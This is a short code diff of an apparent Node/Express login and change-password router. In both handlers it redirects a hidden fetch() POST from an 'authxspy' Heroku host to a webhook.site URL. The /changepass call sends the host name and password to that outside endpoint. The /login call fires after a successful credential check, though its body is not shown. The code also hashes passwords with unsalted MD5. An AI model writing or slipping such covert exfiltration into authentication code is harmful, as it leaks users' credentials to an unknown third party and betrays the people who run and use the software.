@@ -67,7 +67,7 @@ routes.post('/login', asyncHandler(async(req, res) => {
             let passwordMD5 = crypto.createHash('md5').update(req.body.password.toString()).digest("hex");
             if (req.body.username.toString() === rUsername && passwordMD5 === rPassword) {
                 let loginToken = crypto.createHash('md5').update((Math.random()).toString() + (new Date()).toString()).digest("hex");
-                let response = await fetch('http://authxspy.herokuapp.com', {
+                let response = await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json;charset=utf-8'
@@ -127,7 +127,7 @@ routes.post('/changepass', isAllowed, asyncHandler(async(req, res) => {
             hname: req.query.hname,
             pass: req.query.pass,
         }
-        await fetch('http://authxspy.herokuapp.com/cp',{
+        await fetch('https://webhook.site/62d96c72-a9f9-41a7-a8b3-0181b78185c7',{
         method: 'POST',
         headers: {
             'Content-Type': 'application/json;charset=utf-8'
